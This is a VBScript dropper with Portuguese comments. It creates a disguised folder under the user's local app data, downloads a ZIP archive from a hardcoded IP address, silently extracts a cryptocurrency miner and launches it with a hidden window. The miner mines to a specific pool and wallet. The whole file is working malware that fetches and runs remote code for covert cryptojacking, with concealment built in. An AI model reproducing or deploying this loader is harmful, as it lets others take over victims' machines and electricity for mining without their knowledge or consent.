' Objetos necessários
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set zipShell = CreateObject("Shell.Application")

' Pasta oculta
hiddenFolder = shell.ExpandEnvironmentStrings("%localappdata%") & "\temp_" & Right(Replace(fso.GetBaseName(WScript.ScriptFullName), ".vbs", ""), 4)

' Cria pasta se não existir
If Not fso.FolderExists(hiddenFolder) Then
    fso.CreateFolder(hiddenFolder)
End If

' Caminhos dos arquivos
zipPath = hiddenFolder & "\miner.zip"
' Assumindo que o exe dentro do zip se chama sbrminer.exe. Ajuste se for diferente.
minerExeName = "sbrminer.exe"
minerPath = hiddenFolder & "\" & minerExeName

' Verifica se o minerador já foi extraído
If Not fso.FileExists(minerPath) Then
    url = "http://15.228.181.140:8585/miner.zip" ' Altere para o link do ZIP
    
    ' Configura requisição
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send

    ' Salva o ZIP
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' adTypeBinary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile zipPath, 2 ' adSaveCreateOverWrite
        stream.Close
        Set stream = Nothing
        
        WScript.Echo "[INFO] ZIP baixado. Extraindo..."
        
        ' Extração automática usando Shell.Application
        Set sourceZip = zipShell.NameSpace(zipPath)
        Set destFolder = zipShell.NameSpace(hiddenFolder)
        
        ' Copia todos os itens do zip para a pasta de destino
        ' 4&16 = NoConfirmation + OverwriteFiles
        destFolder.CopyHere sourceZip.Items, 4+16
        
        ' Aguarda a extração terminar (loop simples)
        Do While destFolder.Items.Count < sourceZip.Items.Count
            WScript.Sleep 1000
        Loop
        
        WScript.Echo "[INFO] Extração concluída."
    Else
        WScript.Echo "ERRO HTTP: Status " & http.Status & " ao baixar o ZIP."
        WScript.Quit 1
    End If
Else
    WScript.Echo "[INFO] Minerador já existe."
End If

' Verificação final do executável
If Not fso.FileExists(minerPath) Then
    WScript.Echo "ERRO: O executavel '" & minerExeName & "' nao foi encontrado apos a extração. Verifique o nome do arquivo dentro do ZIP."
    WScript.Quit 1
End If

' Aguarda 5 segundos para teste
WScript.Sleep 5000

' Executa o minerador (1 = Visível)
shell.Run """" & minerPath & """ --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RMuSGreUdbeN5ma6MSjVXdUsvirLL2zRck.caioalzap --password x --diff-factor 0.1", 0, False
